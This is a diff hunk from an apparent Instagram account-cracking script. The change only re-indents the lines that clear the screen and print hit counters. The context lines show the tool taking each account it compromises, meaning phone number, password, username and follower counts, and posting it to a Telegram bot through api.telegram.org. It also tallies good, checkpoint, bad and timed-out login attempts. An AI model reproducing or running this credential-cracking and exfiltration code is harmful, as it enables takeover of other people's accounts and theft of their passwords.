@@ -328,10 +328,10 @@ def instagram1():
 						posts = description["content"].split(",")[2].split("-")[0]
 						vi="\nNumber: +"+user+"\npass: "+pasw+"\nUserName: "+email+"\nName: "+name+"\nFollowers: "+followers+"\nFollowing: "+following+"\nPosts: "+posts
 						r.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={vi}\n')
-                        os.system("clear")
-                        print(logo2)
-                        hits+=1
-                        print(f' '+W+'['+G+'+'+W+']'+G+' GOOD '+W+':'+G+' '+str(hits)+' \n '+W+'['+R+'-'+W+']'+R+' Checkpoint '+W+':'+R+' '+str(checkpoint)+' \n '+W+'['+wd+'-'+W+']'+wd+' Bad '+W+':'+wd+' '+str(bad)+'\n '+W+'['+Y+'='+W+'] '+Y+'Timeout '+W+': '+str(timeout)+' \n'+W+' ['+B+'-'+W+']'+B+' Error'+W+' :'+B+' '+str(error)+'\n'+wd+'     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n',end='') 
+						os.system("clear")
+						print(logo2)
+						hits+=1
+						print(f' '+W+'['+G+'+'+W+']'+G+' GOOD '+W+':'+G+' '+str(hits)+' \n '+W+'['+R+'-'+W+']'+R+' Checkpoint '+W+':'+R+' '+str(checkpoint)+' \n '+W+'['+wd+'-'+W+']'+wd+' Bad '+W+':'+wd+' '+str(bad)+'\n '+W+'['+Y+'='+W+'] '+Y+'Timeout '+W+': '+str(timeout)+' \n'+W+' ['+B+'-'+W+']'+B+' Error'+W+' :'+B+' '+str(error)+'\n'+wd+'     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n',end='') 
 			elif '"authenticated":false' in req_login:
 			        os.system("clear")
 			        print(logo2)
